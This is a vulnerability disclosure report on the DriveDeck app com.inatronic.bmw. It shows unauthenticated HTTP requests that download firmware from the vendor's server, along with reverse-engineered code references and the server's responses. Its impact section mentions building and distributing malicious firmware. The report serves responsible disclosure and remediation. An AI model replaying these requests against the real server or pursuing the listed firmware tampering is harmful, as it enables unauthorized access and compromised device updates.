# Vulnerability Report - com.inatronic.bmw- Incorrect Access Control

**Product:** `com.inatronic.bmw`

**Vendor:** [INATRONIC](https://drivedeck.de/)

**Version:** 2.7.1

**Vulnerability Type:** Incorrect Access Control

**Severity:** High

## Description

The `com.inatronic.bmw` , developed by **INATRONIC**, suffers from an Incorrect Access Control vulnerability during the device firmware update process. The app uses HTTP requests to download firmware updates. By reverse engineering the app, it was possible to identify the firmware download mechanism and the download link. Dynamic testing revealed that the vendor's firmware server lacks proper access control, leading to **firmware leakage**.

## Reproduction Steps

1. The `f3658a` Field value in the `C0694a`method provides the necessary URL and other information required for the HTTP request. Static reverse engineering allows for the reconstruction of the complete request as follows:

   ![image-20241003190701783](https://s2.loli.net/2024/10/03/QKyVbukmg7JMUoY.png)

2. Sending this URL request to the firmware server results in a direct response containing the latest firmware information as follows:

   > Request

   ```http
   GET http://download.inatronic.com/version/download_firmware_and.php HTTP/1.1
   User-Agent: Fiddler
   Host: download.inatronic.com
   ```

   ```http
   GET http://download.inatronic.com/version/download_firmware_ios.php HTTP/1.1
   User-Agent: Fiddler
   Host: download.inatronic.com
   
   ```

   > Response:

   ```http
   HTTP/1.1 200 OK
   Connection: close
   Transfer-Encoding: chunked
   Cache-Control: private
   Content-Disposition: inline; filename=drivedeck_and_v27.dat
   Content-Transfer-Encoding: binary
   Content-Type: application/application  ; name=drivedeck_and_v27.dat
   Date: Thu, 03 Oct 2024 11:08:03 GMT
   Expires: 0
   Pragma: public
   Server: Apache
   
   7608
      諾W -Wݙ|  Q     
   ......
   ```

   ```http
   HTTP/1.1 200 OK
   Connection: close
   Transfer-Encoding: chunked
   Cache-Control: private
   Content-Disposition: inline; filename=drivedeck_ios_v27.dat
   Content-Transfer-Encoding: binary
   Content-Type: application/application  ; name=drivedeck_ios_v27.dat
   Date: Thu, 03 Oct 2024 11:08:59 GMT
   Expires: 0
   Pragma: public
   Server: Apache
   
   761a
   r i  tXɋ 0 V  VD     A- " Vzf@u CC    \ ˴ @:"ylb   s B]7ه Ex c ! x  ,
   ......
   ```

3. Consequently, the unprotected firmware can be directly downloaded using this information.

   ![image-20241003183509235](https://s2.loli.net/2024/10/03/WbPNA8RXwlpiqhV.png)

   In total, we successfully downloaded **4 firmware** by exploiting the vulnerability.

## Impact

An attacker can exploit this vulnerability to:

- Download the latest firmware before it is officially released.
- Analyze the firmware for vulnerabilities or proprietary information.
- Create modified firmware images with malicious code.
- Distribute compromised firmware updates to unsuspecting users.

## Remediation

- Implement proper access control on the firmware server, such as device ID and user ID verification.
- Enhance the app's firmware update mechanism to include authentication credentials in the requests.

## Disclaimer

This vulnerability report is provided for informational purposes only and should not be used for any malicious activities. The author is not responsible for any misuse of the information contained herein.